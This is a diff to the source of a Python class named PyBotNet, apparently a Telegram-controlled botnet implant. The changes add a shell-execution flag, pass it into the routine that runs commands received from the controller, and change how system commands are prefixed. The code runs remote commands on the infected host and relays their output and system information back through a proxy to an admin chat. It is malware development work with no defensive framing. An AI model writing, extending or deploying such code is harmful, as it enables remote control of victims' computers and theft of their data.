@@ -15,19 +15,21 @@ class PyBotNet:
     '''
 
     def __init__(
-        self,
-        TELEGRAM_TOKEN,
-        ADMIN_CHAT_ID,
-        show_log=False,
-        send_system_data=True
-    ):
+            self,
+            TELEGRAM_TOKEN,
+            ADMIN_CHAT_ID,
+            show_log=False,
+            send_system_data=True,
+            is_shell=True):
 
         self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
         self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
         self.show_log = show_log  # show logs
         self.send_system_data = send_system_data  # send system info in message
+        self.is_shell = is_shell
 
         self.start_time = util.get_current_epoc_time()
+
         # logging:
         if self.show_log:
             # show all log's
@@ -95,11 +97,15 @@ class PyBotNet:
                     f'command received: \n{self.command}')
 
                 self.output = scripts.execute_scripts(
-                    self.command, self.pybotnet_up_time(), self.logger)
+                    self.command, self.pybotnet_up_time(), self.is_shell, self.logger)
 
                 if self.output:
                     self.send_message_by_third_party_proxy(
                         f'output: \n{self.output}')
+            else:
+                self.logger.info('invalid command')
+        else:
+            self.logger.info('None command')
 
     def get_system_info(self) -> str:
         '''
@@ -113,7 +119,7 @@ class PyBotNet:
 
     def run_command_in_system(self, command: str) -> str:
         '''run system command in console and return data'''
-        return scripts.execute_cmd('None '+command, self.logger)
+        return scripts.execute_cmd('cmd '+command, self.logger)
 
     def run_ls(self, route: str) -> str:
         '''return list of directory or files'''
